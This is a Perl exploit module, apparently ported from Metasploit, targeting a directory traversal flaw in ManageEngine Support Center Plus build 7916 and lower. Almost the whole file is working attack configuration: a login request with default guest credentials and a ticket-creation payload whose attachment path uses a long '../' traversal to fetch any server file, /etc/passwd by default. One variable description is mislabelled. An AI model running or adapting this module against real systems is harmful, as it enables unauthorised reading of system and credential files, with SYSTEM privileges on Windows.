package SUPPORT::MSF::SupportCenterPlusDirectoryTraversal;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "SupportCenterPlusDirectoryTraversal";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION      => "

        This module exploits a directory traversal vulnerability found in ManageEngine

        Support Center Plus build 7916 and lower. The module will create a support ticket

        as a normal user, attaching a link to a file on the server. By requesting our

        own attachment, it's possible to retrieve any file on the filesystem with the same

        privileges as Support Center Plus is running. On Windows this is always with SYSTEM

        privileges.

      ",
  FORMTITLE        => "WorkOrderForm",
  LOGONDOMAINTITLE => "undefined",
  METHOD           => "GET",
  MSF_MODULE       => "support_center_plus_directory_traversal",
  OSVDB            => 102656,
  PATH             => "module=Request&ID=__ID__&authKey=__AUTHKEY__&",
  PATHS            => [""],
  PAYLOAD          => "j_username=__J_USERNAME__&j_password=__J_PASSWORD__&logonDomainName=undefined&sso_status=false&loginButton=Login&reqTemplate=&prodId=0&priority=2&reqID=2&usertypename=Requester&reqName=Guest&category=0&item=0&subCategory=0&title=__TITLE__&description=__DESCRIPTION__&MOD_IND=WorkOrder&FORMNAME=WorkOrderForm&attach=/../../../../../../../../../../../..__FILE__&attPath=&component=Request&attSize=__ATTSIZE__&attachments=__ATTACHMENTS__&autoCCList=&addWO=addWO&",
  REQTITLE         => "Guest",
  USERTYPETITLE    => "Requester",
  VARIABLES => {
    'PASS' =>       { DESCRIPTION => "The Support Center Plus password", VALUE => "guest" },
    'AUTHKEY' =>       { DESCRIPTION => "", VALUE => "" },
    'J_USERNAME' =>       { DESCRIPTION => "", VALUE => "" },
    'FILE' =>       {
  DESCRIPTION => "The Support Center Plus password",
  VALUE => "/etc/passwd",
},
    'USER' =>       { DESCRIPTION => "The Support Center Plus user", VALUE => "guest" },
    'PATH' =>       {
  DESCRIPTION => "The base path to the Support Center Plus installation",
  VALUE => "/",
},
    'ID' =>       { DESCRIPTION => "", VALUE => "" },
    'ATTACHMENTS' =>       { DESCRIPTION => "", VALUE => "" },
    'ATTSIZE' =>       { DESCRIPTION => "", VALUE => "" },
    'DESCRIPTION' =>       { DESCRIPTION => "", VALUE => "" },
    'J_PASSWORD' =>       { DESCRIPTION => "", VALUE => "" },
    'TITLE' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'SCANNER',
  REQUESTS => {
    EXPLOIT2 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #2 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'j_security_check',
      PAYLOAD      => 'j_username=__USERNAME__&j_password=__PASSWORD__&logonDomainName=undefined&sso_status=false&loginButton=Login',
      TEXT   => 'Sending Exploit #1 Request : [POST] /j_security_check',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
